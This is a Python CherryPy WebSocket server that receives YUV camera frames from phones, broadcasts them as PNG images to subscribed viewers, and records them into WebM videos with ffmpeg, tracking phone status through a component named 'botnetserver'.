from __future__ import print_function
import PIL
from PIL import Image, ImageDraw, ImageFont
import cherrypy
import json
from cherrypy import tools
from ws4py.server.cherrypyserver import WebSocketPlugin, WebSocketTool, WebSocketHandler
WebSocketPlugin(cherrypy.engine).subscribe()
from multiprocessing import Pool, cpu_count
import time
from time import strftime
from yuv420sp import yuvtoimg
import six
import base64
import socket
import sys
import traceback
import scipy as sp
import common
import os
from subprocess import check_output

tools.websocket = WebSocketTool()

CAMWIDTH, CAMHEIGHT = 768,432
zeroes=6
iformat = "png" # to be used in mime type

class BroadcastWSHandler(WebSocketHandler):
    subs = {}

    @classmethod
    def sendtoall(cls, data, thisphone):
      try:
       for sub in cls.subs[thisphone]:
        try:
          sub.send(data, False)
        except socket.error as e:
          co = sys._getframe(0).f_code
          cherrypy.log("%s:%s: %s" % (co.co_filename, co.co_firstlineno, str(e)))
          cls.subs[thisphone].remove(sub)
      except KeyError:
        cherrypy.log("couldn't broadcast! this phone has no registered listeners")
        pass

    def send(self, a1, a2):
      cherrypy.log(str(self.send) + ": " + str(len(a1)))
      #traceback.print_stack()
      super(BroadcastWSHandler, self).send(a1, a2)
    @classmethod
    def getSubscriberCount(cls, thisphone):
      try:
        return len(cls.subs[thisphone])
      except KeyError:
        cherrypy.log("didn't even know " + str(thisphone))
        cls.subs[thisphone] = []
        return cls.getSubscriberCount(thisphone)
    @staticmethod
    def getbinnoimgavailable():
      w,h = 512, 48
      bg_colour = (255, 255, 255)
      bg_image = sp.dot(sp.ones((h,w,3), dtype='uint8'), sp.diag(sp.asarray((bg_colour), dtype='uint8')))
      img = Image.fromarray(bg_image)
      draw = ImageDraw.Draw(img)
      try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/ttf-droid/DroidSans-Bold.ttf", 32)
      except IOError:
        font = None
      draw.text((5,5), "Waiting for phone...", fill="rgb(0,0,0)", font=font)
      str = six.StringIO()
      img.save(str, format="PNG")
      return ("PNG", str.getvalue())
      
    def opened(self):
      super(self.__class__, self).opened()
      try:
        phonesublist = self.__class__.subs[self.phone]
      except KeyError:
        phonesublist = self.__class__.subs[self.phone] = []
      phonesublist.append(self)
      count = self.__class__.getSubscriberCount(self.phone)
      cherrypy.log(str(self.phone) + ": now has " + str(count))
      if count == 1:
        self.parent.receiver.notifyall(self.phone)
      #try:
      #  l = len(self.parent.receiver.phones[self.phone])
      #except KeyError: 
      #  l = 0
      #cherrypy.log(str(l))
      #if l == 0:
      #  self.sendwaitimg()
        
    def close(self, code, reason):
      self.__class__.subs[self.phone].remove(self)
      super(self.__class__, self).close()
    def received_message(self, m):
      cherrypy.log(str(m.data))
      if (str(m.data) == "getwaitimg"):
        self.sendwaitimg()
      if (str(m.data) in ["recstop", "recstart"]):
        try:
          rece = self.parent.receiver.phones[self.phone]
        except KeyError:
          cherrypy.log("was asked to do video action with no feed")
          return
        for sender in rece:
          if str(m.data) == "recstop": sender.stop()
          if str(m.data) == "recstart": sender.start()
    def sendwaitimg(self):
        (itype, idata) = self.__class__.getbinnoimgavailable()
        img = "data:image/" + itype.lower() + ";base64," + base64.b64encode(idata)
        self.send(img, False)

def save(png, v, frameno):
  try:
    os.mkdir("cam/" + v.serial)
  except OSError as e:
    if e.errno != 17: # already exists
      raise e
  f = open("cam/" + v.serial + "/" + str(frameno).zfill(zeroes) + ".yuv", "wb")
  f.write(png)
  f.close()

def resize(img):
  basewidth = 500
  wpercent = (basewidth/float(img.size[0]))
  hsize = int((float(img.size[1])*float(wpercent)))
  img = img.resize((basewidth,hsize), PIL.Image.NEAREST)
  return img

def getjpegstr(img):
  output = six.StringIO()
  #img.save(output, format="JPEG", quality=20)
  img.save(output, format=iformat, optimize=False)
  stuff = output.getvalue()
  output.close()
  return stuff

def process(data, phoneserial, bSave, frameno, v):
  print("testing")
  cherrypy.log("processing!")
  #self.send(m.data, m.is_binary)
  #path = "cam/" + strftime("%B-%H-%M-%S.png")
  #dec = base64.b64decode(m.data)
  #arr = array.array("B")
  #arr.fromstring(dec)
  yuv = data
  if bSave:
    save(yuv, v, frameno)
  w,h = CAMWIDTH,CAMHEIGHT
  img = yuvtoimg(yuv, w, h)
  #img = resize(img)
  stuff = getjpegstr(img)
  stuff="data:image/" + iformat.lower() + ";base64," + base64.b64encode(stuff)
  BroadcastWSHandler.sendtoall(stuff,phoneserial)
  cherrypy.log("finished!")

class ReceiverWSHandler(WebSocketHandler):
    #pool = Pool(processes=cpu_count())
    phones = {}
    currentlyProcessingCount = 0

    def start(self):
      try: 
        v = self.parent.botnetserver.statuses[self.phone]
      except KeyError:
        cherrypy.log("starting nonexistant phone")
        return
      e = common.VideoStatus
      if not v.videostatus in [e.SENDING]:
        cherrypy.log("can't start phone not sending")
        return
      v.videostatus = e.RECORDING
      self.frameno = 0
      self.parent.uicls.sendall(common.phoneStatusUpdate(v))
    def stop(self):
      e = common.VideoStatus
      v = self.parent.botnetserver.statuses[self.phone]
      if not (v.videostatus == e.RECORDING):
        cherrypy.log("tried stopping video that isn't recording!")
        return

      path = self.gen_video(v.serial)
      self.parent.uicls.sendall(common.newVideo(path,v))

      v.videostatus = e.SENDING
      self.parent.uicls.sendall(common.phoneStatusUpdate(v))

    def opened(self):
      super(self.__class__, self).opened()
      try:
        phonesenlist = self.__class__.phones[self.phone]
      except KeyError:
        phonesenlist = self.__class__.phones[self.phone] = []
      phonesenlist.append(self)
      try: 
        v = self.parent.botnetserver.statuses[self.phone]
      except KeyError:
        raise Exception("this phone wasn't registered in the status register! i.e. /updatestatus wasn't called")
      v.videostatus = common.VideoStatus.SENDING
      self.parent.uicls.sendall(common.phoneStatusUpdate(v))
    def close(self, code, reason):
      v = self.parent.botnetserver.statuses[self.phone]
      if v.videostatus == common.VideoStatus.RECORDING: self.stop()
      v.videostatus = common.VideoStatus.NOTSENDING
      self.parent.uicls.sendall(common.phoneStatusUpdate(v))

      self.__class__.phones[self.phone].remove(self)

      super(self.__class__, self).close()
    def gen_video(self, serial):
      v = self.parent.botnetserver.statuses[serial]
      no = v.videoscount
      path = "static/videos/" + serial + "." + str(no) + ".webm";
      check_output("ffmpeg -r 2 -f image2 -vcodec rawvideo -pix_fmt yuv420p -s " + ("%dx%d" % (CAMWIDTH, CAMHEIGHT)) + " -i".split(" ") +  ["cam/" + serial + "/%" + str(zeroes).zfill(2) + "d.yuv"] + "-r 2".split(" ") + [path]);
      for i in range(self.frameno):
        os.unlink("cam/" + serial + "/" + str(i).zfill(zeroes) + ".yuv")
      no += 1
      v.videoscount = no
      return path
    @classmethod
    def notifyall(cls,serial):
      try:
        for phone in cls.phones[serial]:
          phone.getnext()
      except KeyError:
        pass

    def received_message(self, m):
      assert m.is_binary
      #f = open(time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()) + ".yuv", "wb")
      #f.write(m.data)
      #f.close()
      
      if self.parent.broadcaster.getSubscriberCount(self.phone) == 0:
        cherrypy.log("no subscribers...")
        return
      v = self.parent.botnetserver.statuses[self.phone]
      bSave = v.videostatus == common.VideoStatus.RECORDING
      if bSave:
        no = self.frameno
      else:
        no = float("nan")
      process(str(m.data), self.phone, bSave, no, v)
      #self.__class__.pool.apply_async([process, str(m.data), self.phone, bSave, no, v])
      if bSave:
        self.frameno += 1
      if self.__class__.currentlyProcessingCount >= 3:
        cherrypy.log("too busy, not asking for next")
        return
      self.getnext()
    def getnext(self):
      self.send(json.dumps({"command": "getnext"}), False)
    
    #p = profiler.Profiler(".")

class UIWSHandler(WebSocketHandler):
    clients = []
    def received_message(self, m):
      if m.data == "getactive":
        active = self.parent.botnetserver.getactive
        cherrypy.log("ui: " + str(active))
        for v in active():
          self.__class__.sendall(common.phoneStatusUpdate(v))
          self.__class__.sendall(common.commandListUpdate(v))
        
    def opened(self):
      super(self.__class__, self).opened()
      self.__class__.clients.append(self)
    def close(self, code, reason):
      self.__class__.clients.remove(self)
      super(self.__class__, self).close()
    @classmethod
    def sendall(cls,data):
      cherrypy.log("sending: %s" % data)
      for client in cls.clients:
        try:
          client.send(data, False)
        except socket.error as e:
          co = sys._getframe(0).f_code
          cherrypy.log("%s:%s: %s" % (co.co_filename, co.co_firstlineno, str(e)))
          cls.clients.remove(client)

class WSRoot(object):
  #global BroadcastWSHandler, ReceiverWSHandler, UIWSHandler
  #pool = None
  receiver=ReceiverWSHandler
  broadcaster=BroadcastWSHandler
  uicls=UIWSHandler

  @cherrypy.expose
  @tools.websocket(handler_cls=BroadcastWSHandler)
  def subscribe(self, phone):
    cherrypy.request.ws_handler.parent=self
    cherrypy.request.ws_handler.phone=phone

  @cherrypy.expose
  @tools.websocket(handler_cls=UIWSHandler)
  def ui(self):
    cherrypy.request.ws_handler.parent=self

  @cherrypy.expose
  @tools.websocket(handler_cls=ReceiverWSHandler)
  def img(self,phone):
    #  self.p.run(self._img)
    #def _img(self):
    cherrypy.request.ws_handler.parent=self
    cherrypy.request.ws_handler.phone=phone
    #cherrypy.request.ws_handler.__class__.pool=self.__class__.pool

  #@cherrypy.expose
  #def index(self):
  #  cherrypy.log("Handler created: %s" % repr(request.ws_handler))

